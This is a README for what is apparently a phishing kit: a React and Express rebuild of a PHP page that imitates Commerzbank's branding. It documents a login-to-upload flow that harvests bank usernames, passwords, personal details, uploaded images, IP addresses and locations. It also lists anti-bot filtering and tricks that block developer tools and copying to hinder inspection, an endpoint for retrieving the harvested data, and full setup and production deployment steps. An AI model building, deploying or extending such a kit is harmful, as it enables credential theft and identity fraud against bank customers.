# Commerzbank React Application

This is a React.js conversion of the original PHP Commerzbank application, maintaining all the same specifications and functionality.

## Features

- **Multi-step form process**: Login → Information → Upload → Done
- **Security features**: Anti-bot protection, IP tracking, developer tools blocking
- **Form data collection**: Personal information, login credentials, file uploads
- **Commerzbank branding**: Authentic-looking UI with bank styling
- **Session management**: Data persistence across pages
- **File upload**: Image file upload with validation
- **Responsive design**: Mobile-friendly interface


## Project Structure

```
react-app/
├── src/
│   ├── components/
│   │   ├── LoginPage.tsx      # Login form
│   │   ├── InfoPage.tsx       # Personal information form
│   │   ├── UploadPage.tsx     # File upload form
│   │   ├── DonePage.tsx       # Success page
│   │   └── SecurityScript.tsx # Security and anti-bot features
│   ├── services/
│   │   └── api.ts            # API service layer
│   ├── App.tsx               # Main app component with routing
│   ├── App.css               # Styling
│   └── index.tsx             # Entry point
├── backend/
│   ├── server.js             # Express.js backend server
│   ├── package.json          # Backend dependencies
│   └── uploads/              # File upload directory
└── package.json              # Frontend dependencies
```

## Setup Instructions

### Prerequisites

- Node.js (v14 or higher)
- npm or yarn

### Frontend Setup

1. Navigate to the react-app directory:
   ```bash
   cd react-app
   ```

2. Install dependencies:
   ```bash
   npm install
   ```

3. Start the development server:
   ```bash
   npm start
   ```

The React app will be available at `http://localhost:3000`

### Backend Setup

1. Navigate to the backend directory:
   ```bash
   cd backend
   ```

2. Install dependencies:
   ```bash
   npm install
   ```

3. Start the backend server:
   ```bash
   npm start
   ```

The backend API will be available at `http://localhost:3001`

### Production Build

To build the React app for production:

```bash
npm run build
```

## API Endpoints

The backend provides the following endpoints:

- `POST /api/login` - Handle login form submission
- `POST /api/info` - Handle personal information submission
- `POST /api/upload` - Handle file upload
- `POST /api/final` - Handle final data submission
- `GET /api/data` - Retrieve collected data (for monitoring)
- `GET /api/health` - Health check endpoint

## Security Features

The application includes the same security features as the original PHP version:

- **Developer tools blocking**: Prevents F12, Ctrl+Shift+I, etc.
- **Right-click prevention**: Disables context menu
- **Text selection blocking**: Prevents text selection
- **Copy/paste prevention**: Blocks clipboard operations
- **Drag prevention**: Disables element dragging
- **Console protection**: Blocks developer console access

## Data Collection

The application collects the following data:

1. **Login credentials**: Username and password
2. **Personal information**: First name, last name, birth date, phone number
3. **File uploads**: Image files (JPG, PNG, GIF)
4. **System information**: IP address, user agent, timestamp
5. **Location data**: IP-based location (if available)

## Configuration

### Environment Variables

Create a `.env` file in the react-app directory:

```
REACT_APP_API_URL=http://localhost:3001/api
```

### Backend Configuration

The backend server can be configured by modifying the `server.js` file:

- Change the port by setting the `PORT` environment variable
- Modify file upload limits in the multer configuration
- Add additional security measures as needed

## Development

### Adding New Features

1. Create new components in the `src/components/` directory
2. Add new API endpoints in the backend `server.js`
3. Update the routing in `App.tsx` if needed
4. Add corresponding API methods in `src/services/api.ts`

### Styling

The application uses CSS modules and custom CSS. Main styles are in `App.css`. The styling maintains the Commerzbank brand appearance.

## Deployment

### Frontend Deployment

1. Build the React app:
   ```bash
   npm run build
   ```

2. Deploy the `build` folder to your web server

### Backend Deployment

1. Install production dependencies:
   ```bash
   npm install --production
   ```

2. Start the server:
   ```bash
   npm start
   ```

3. Use a process manager like PM2 for production:
   ```bash
   npm install -g pm2
   pm2 start server.js --name commerzbank-backend
   ```

## Notes

- This application is a direct conversion of the original PHP application
- All functionality and specifications have been maintained
- The UI/UX remains identical to the original
- Security features are implemented using React hooks and event listeners
- Data collection and storage behavior matches the original PHP implementation
